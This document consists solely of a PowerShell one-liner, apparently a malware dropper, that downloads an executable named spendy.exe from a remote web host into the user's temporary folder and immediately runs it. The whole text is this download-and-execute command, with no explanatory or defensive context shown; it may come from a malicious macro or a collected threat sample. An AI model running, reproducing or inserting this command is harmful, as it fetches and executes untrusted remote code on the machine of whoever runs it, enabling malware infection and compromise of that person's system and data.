
(New-Object System.Net.WebClient).DownloadFile('http://labid.com.my/spe/spendy.exe',"$env:TEMP\spendy.exe");Start-Process ("$env:TEMP\spendy.exe")

